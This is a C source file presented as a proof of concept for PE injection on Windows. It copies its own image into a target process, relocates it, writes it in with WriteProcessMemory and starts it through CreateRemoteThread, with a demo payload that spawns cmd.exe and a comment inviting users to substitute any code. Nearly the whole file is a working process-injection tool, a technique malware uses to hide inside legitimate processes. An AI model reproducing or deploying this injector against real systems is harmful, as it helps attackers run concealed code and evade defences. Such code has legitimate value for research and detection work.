#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <cstdio>
#include <tlhelp32.h>
#include <strsafe.h>

#define STATUS_SUCCESS 0
#define STATUS_FAIL -1

/*
Inject PE - PE injection
This is a POC for the PE injection described here (and many other places): Ten Process Injection Techniques: A Technical Survey of Common and Trending Process Injection Techniques | Endgame Use:

Update the entryThread function as you want - that will be executed in the target
Run: injectpe.exe [target process]

https://github.com/theevilbit/injection/tree/master/InjectPE/InjectPE


*/
//source: https://msdn.microsoft.com/en-us/library/windows/desktop/ms680582(v=vs.85).aspx
void ErrorExit(LPTSTR lpszFunction)
{
	// Retrieve the system error message for the last-error code
	LPVOID lpMsgBuf;
	DWORD dw = GetLastError();

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf,
		0, NULL);

	// Display the error message and exit the process
	//wprintf(L"[-] %s failed with error 0x%x: %s", lpszFunction, dw, lpMsgBuf);

	LocalFree(lpMsgBuf);
	ExitProcess(dw);
}

/**
DWORD FindPIDByName(LPWSTR pName)
{
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if ((DWORD)snapshot < 1)
	{
		ErrorExit(TEXT("CreateToolhelp32Snapshot"));
	}
	if (Process32First(snapshot, &pEntry) == TRUE)
	{
		while (Process32Next(snapshot, &pEntry) == TRUE)
		{
			if (NULL != wcsstr(pEntry.szExeFile, pName))
			{
				return pEntry.th32ProcessID;
			}
		}
		ErrorExit(TEXT("Process32Next"));
	}
	else
	{
		ErrorExit(TEXT("Process32First"));
	}

	CloseHandle(snapshot);
	return 0;
}
*/
/**
int GetFunctionAddressFromDll(PSTR pszDllName, PSTR pszFunctionName, PVOID *ppvFunctionAddress)
{
	HMODULE hModule = NULL;
	PVOID	pvFunctionAddress = NULL;

	hModule = GetModuleHandleA(pszDllName);
	if (NULL == hModule)
	{
		ErrorExit(TEXT("GetModuleHandleA"));
	}

	pvFunctionAddress = GetProcAddress(hModule, pszFunctionName);
	if (NULL == pvFunctionAddress)
	{
		ErrorExit(TEXT("GetProcAddress"));
	}

	*ppvFunctionAddress = pvFunctionAddress;
	return STATUS_SUCCESS;
}
*/


//http://www.rohitab.com/discuss/topic/40841-pe-injection-advanced-memory-code-injection-technique/
//http://www.rohitab.com/discuss/topic/40160-inject-code-into-other-processes-using-pe-injection/

#define CountRelocationEntries(dwBlockSize) (dwBlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY)

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;

} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

DWORD WINAPI entryThread(LPVOID param)
{
	WinExec("cmd.exe", 1);
	return 0;
}

DWORD demoInjectPE(DWORD dwProcessId) //to read in arguments as unicode
{
	//find the process ID by name
	DWORD pid = dwProcessId;
	printf("[+] PID is: %d,0x%x\n", (UINT)pid, (UINT)pid);

	//open process with all access
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
	{
		wprintf(TEXT("Error: OpenProcess"));
	}
	printf("[+] Process handle: 0x%Ix\n", (SIZE_T)hProcess);

	//Get our module handle
	HMODULE hSelf = GetModuleHandle(NULL);
	if (!hSelf)
	{
		wprintf(TEXT("Error: GetModuleHandle"));
	}

	PIMAGE_DOS_HEADER pSelfDosHeader, pSelfCopyDosHeader;
	PIMAGE_NT_HEADERS pSelfNTHeader, pSelfCopyNTHeader;
	PIMAGE_SECTION_HEADER pSelfCopySectionHeader;

	pSelfDosHeader = (PIMAGE_DOS_HEADER)hSelf;

	// Get the address of the IMAGE_NT_HEADERS
	pSelfNTHeader = (PIMAGE_NT_HEADERS)((LPBYTE)hSelf + pSelfDosHeader->e_lfanew);


	if (IsBadReadPtr(hSelf, pSelfNTHeader->OptionalHeader.SizeOfImage))
	{
		wprintf(TEXT("Error: IsBadReadPtr"));
	}

	printf("[*] Trying to allocate new memory space in target process\r\n");
	LPVOID lpNewImageBaseAddress = VirtualAllocEx(hProcess, NULL, pSelfNTHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!lpNewImageBaseAddress)
	{
		wprintf(TEXT("Error: VirtualAllocEx"));
	}

	printf("[+] Memory in target process: 0x%Ix\r\n", (SIZE_T)lpNewImageBaseAddress);
	/* make a copy of ourselves to work on before the copy */

	printf("[*] Trying to allocate temporary memory to work on\r\n");
	LPVOID lpSelfCopyBaseAddress = VirtualAlloc(NULL, pSelfNTHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!lpSelfCopyBaseAddress)
	{
		wprintf(TEXT("Error: VirtualAlloc"));
	}
	printf("[+] Temporary memory: 0x%Ix\r\n", (SIZE_T)lpSelfCopyBaseAddress);

	//copy ourselves to the new space
	RtlCopyMemory(lpSelfCopyBaseAddress, hSelf, pSelfNTHeader->OptionalHeader.SizeOfImage);

	pSelfCopyDosHeader = (PIMAGE_DOS_HEADER)lpSelfCopyBaseAddress;
	pSelfCopyNTHeader = (PIMAGE_NT_HEADERS)((LPBYTE)lpSelfCopyBaseAddress + pSelfCopyDosHeader->e_lfanew);

	// Overwrite ImageBase value in the copy in memory
	pSelfCopyNTHeader->OptionalHeader.ImageBase = (SIZE_T)lpNewImageBaseAddress;
	printf("[*] Writing executable image into child process.\r\n");


	/* Reloaction of VAs */
	// offset between the the original ImageBase found in the file and the location loaded in the memory
	SIZE_T dwDelta = (SIZE_T)lpNewImageBaseAddress - pSelfNTHeader->OptionalHeader.ImageBase;
	SIZE_T dwOldDelta = (DWORD_PTR)((LPBYTE)hSelf - pSelfNTHeader->OptionalHeader.ImageBase);
	printf("[+] Delta, Old Delta: 0x%Ix, 0x%Ix\r\n", dwDelta, dwOldDelta);

	for (int x = 0; x < pSelfCopyNTHeader->FileHeader.NumberOfSections; x++)
	{
		// find .reloc section
		char* pSectionName = ".reloc";
		pSelfCopySectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)hSelf + pSelfCopyDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (x * sizeof(IMAGE_SECTION_HEADER)));
		if (memcmp(pSelfCopySectionHeader->Name, pSectionName, strlen(pSectionName)))
			continue;

		printf("[*] Rebasing image\r\n");

		DWORD dwRelocSectionRawData = pSelfCopySectionHeader->PointerToRawData;
		DWORD dwOffsetInRelocSection = 0;

		IMAGE_DATA_DIRECTORY relocData = pSelfCopyNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

		// parse reloaction data
		while (dwOffsetInRelocSection < relocData.Size)
		{
			PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)((SIZE_T)lpSelfCopyBaseAddress + dwRelocSectionRawData + dwOffsetInRelocSection);

			dwOffsetInRelocSection += sizeof(BASE_RELOCATION_BLOCK);

			if (pBlockheader->BlockSize > 0 && pBlockheader->PageAddress > 0)
			{
				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);

				PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)((SIZE_T)lpSelfCopyBaseAddress + dwRelocSectionRawData + dwOffsetInRelocSection);

				for (DWORD y = 0; y < dwEntryCount; y++)
				{
					dwOffsetInRelocSection += sizeof(BASE_RELOCATION_ENTRY);

					if (pBlocks[y].Type == 0)
						continue;

					SIZE_T dwFieldAddress = pBlockheader->PageAddress + pBlocks[y].Offset;

					//printf("[*] Reading from 0x%p\r\n", (PVOID)((SIZE_T)lpNewImageBaseAddress + dwFieldAddress));
					SIZE_T dwBuffer = 0;
					RtlCopyMemory(&dwBuffer, (PVOID)((SIZE_T)lpSelfCopyBaseAddress + dwFieldAddress), sizeof(SIZE_T));

					//printf("[*] Relocating 0x%Ix -> 0x%Ix\r\n", dwBuffer, dwBuffer + dwDelta - dwOldDelta);

					dwBuffer += dwDelta;
					dwBuffer -= dwOldDelta;
					//printf("[*] Writing 0x%p to 0x%p\r\n", dwBuffer, (PVOID)((SIZE_T)lpNewImageBaseAddress + dwFieldAddress));
					RtlCopyMemory((PVOID)((SIZE_T)lpSelfCopyBaseAddress + dwFieldAddress), &dwBuffer, sizeof(SIZE_T));
				}
			}
		}
	}

	wprintf(TEXT("done loop..."));

	// Write the updated code to the target process
	if (!WriteProcessMemory(hProcess, lpNewImageBaseAddress, lpSelfCopyBaseAddress, pSelfNTHeader->OptionalHeader.SizeOfImage, NULL))
	{
		wprintf(TEXT("Error: WriteProcessMemory"));
	}

	printf("[*] Starting remote thread\r\n");
	LPTHREAD_START_ROUTINE remoteThread = (LPTHREAD_START_ROUTINE)((LPBYTE)(HMODULE)lpNewImageBaseAddress + (DWORD_PTR)((LPBYTE)entryThread - (LPBYTE)hSelf));
	/* Call the distant routine in a remote thread  */
	if (!CreateRemoteThread(hProcess, NULL, 0, remoteThread, NULL, 0, NULL))
	{
		wprintf(TEXT("Error: CreateRemoteThread"));
	}

	return 0;
}

